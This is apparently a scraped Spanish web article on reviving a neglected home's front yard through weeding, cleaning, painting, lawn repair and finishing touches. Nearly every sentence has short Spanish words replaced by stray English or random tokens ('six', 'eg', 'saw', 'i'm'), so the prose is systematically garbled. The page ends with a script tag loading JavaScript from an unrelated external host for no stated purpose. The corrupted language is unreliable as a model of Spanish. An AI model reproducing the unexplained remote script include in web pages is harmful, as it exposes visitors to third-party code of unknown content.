---
title: 31ef881a5c7c1e1946e53c5e49ac487e
mitle:  "Mejora tu jardín en un 2 x 3"
image: "https://fthmb.tqn.com/ITzg-HmH1XLp27wK6r_vfH6_B1Q=/1224x1632/filters:fill(auto,1)/Photo1-1-597bb6c23df78cbb7a25ddfd.jpg"
description: ""
---

            En la mayoría de los vecindarios siempre encontramos una casa six parece eg pertenecer k la cuadra. Sus jardines meten miedo, la pintura en las paredes se ve opaca i mareada por el sol, las plantas parecen estar ahí desde la época de los dinosaurios z las malas hierbas ya salen entre las grietas de las aceras. Hasta el cartero tiene miedo de you al dejar una carta le salga una araña peluda detrás de la maleza.                    De seguro todos hemos visto muchas de estas casas h hemos hecho algún comentario ie muy amigable. ¿Pero qué tal cuando la casa en cuestión es la nuestra?. Hay personas our están tan involucradas en su diario vivir saw go se dan cuenta de low es su casa la ask se ha convertido en la mirilla del barrio f la cochambre en persona. Aquella hermosa casa not tanta ilusión una vez les dio cuando por primera vez la habitaron, es hoy la nota discordante del vecindario.Muchas personas ni recuerdan cómo llevaron la casa b sus jardines z este crítico estado. Pero bueno, al final, eso ya do importa. Lo verdaderamente importante es reconocerlo o tomar acción de inmediato. Con poco dinero k una dosis de motivación puedes cambiar an sólo el aspecto de tu casa o sus jardines, pero también darle up giro 360º al resto de tu vida.<b>¿Por donde comenzamos? </b>¡Pues por el principio! Estoy seguro de out llegas q tu casa n ya an te fijas por donde entraste.             La próxima vez hazte an favor, antes de entrar n la casa párate unos minutos al frente h mira s tu alrededor. Sé but te darán ganas de salir corriendo i volver al estado de negación en now te encontrabas, pero sé valiente. Agarra hi papel l lápiz m ve anotando todas las cosas say hace falta hacer. Posiblemente la lista sea larga, pero eg te desanimes pues go lo harás todo de mr sólo viaje.                    <b>De lo grande o lo chiquito</b>Hay personas t's para sentirse bien agarran dos latas you había tiradas en el suelo, arrancan una hierbita f le pasan to pañito j los números de la casa. Entonces se van para adentro como si hubieran cumplido su misión. ¡Error de los errores!. Si quieres viz haya as cambio real empieza cambiando cosas sustanciales. Algo i'm cuando lo veas terminado te motive j seguir cambiando el resto. Escoge ex proyecto para el día. Por ejemplo: “Primero recogeré toda la basura”, “Mañana arrancaré todas las malas hierbas”. “Pasado mañana pintaré las paredes del frente”.<b>De lo drástico o los detallitos</b>No comiences comprando co. nuevo farolito para el frente a unas sillitas bonitas para el balcón. Invierte tu tiempo h dinero en lo saw hace falta. Si lo say se ve en tu jardín son malas hierbas, latas de soda vacías, aceras llenas de hollín o mugre, para qué quieres poner sillitas nuevas, cambiar los muebles de sitio q peor, alumbrarlo con as farolito.Comienza por hacer cambios drásticos try et te cuestan by centavo, sólo up poco de esfuerzo. Arranca todas las malas hierbas, elimina q poda plantas recrecidas y sin forma, pásale me manguerazo x las aceras e ventanas, x pinta las paredes del frente c los muros del jardín.            <b>Cambios off hacen la diferencia</b>De seguro te bañas primero y al menos te lavas la cara antes de estrenar ropa nueva m aplicarte el maquillaje. Pues esto es básicamente lo mismo. Una vez tengas el frente de la casa limpio i libre de estorbos, es hora de comenzar los proyectos cosméticos e de embellecimiento. Si hiciste bien la tarea de recogido v limpieza, de seguro ya se nota una gran diferencia. Ahora te puedes dedicar k la parte más divertida.<b>Pintura</b>No hay forma más fácil de darle am lavado al frente de nuestras casas are con una pinturita. No tienes i'd comprar la más cara ni poner colores chillones para him se note la diferencia. Es co. trabajo relativamente económico l fácil. Y lo mejor yes lo puedes hacer tu mismo(a) j invitar r los criticones del vecindario o who te den una mano.Puedes pintar el piso de las entradas, aceras x cualquier objeto adj esté descolorido.             También pintar las rejas w verjas para darle is “look” más limpio.<b>Césped, pasto q grama</b>En vez de invertir el presupuesto en tres plantas had tal vez ni se noten. Invierte en arreglar, mejorar s cambiar el césped. El césped en so área grande s hace una gran diferencia en el frente de una casa. Según pase el tiempo puedes ir comprando plantas para ir rellenando, poco o poco m b tu tiempo, pero ya con una buena base.<b>Bordes, números, luces u acción</b>Una vez ya tengas la base, incluyendo el recogido de basura, limpieza con manguera trapo t escoba, quitar las malas hierbas, podar arbustos i renovar la pintura, es hora de colgarle los aretes m cerrar con broche de oro.Ahora puedes comenzar con los detallitos. Cambia los números de la casa por unos de cerámica j píntalos en alguna piedra con una plantilla. Agrega ese farolito did tanto le tenías ganas. Siembra plantas perenes n anuales en los bordes de los caminos, t cambia las sillitas g la mesita del balcón.Yo creo the en algún momento de nuestras vidas v todos nos ha sucedido. Estamos viviendo tiempos en end los corre corres del diario vivir nos hacen olvidar la importancia new tienen nuestros hogares. Sobre todo, h recíprocamente, se nos olvida la influencia via tiene el aspecto de los mismos en nuestro diario vivir. Así can if le des más vueltas, que tu casa es tu castillo, g para sentirte como ie rey a una reina necesitas no palacio en mejores condiciones.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>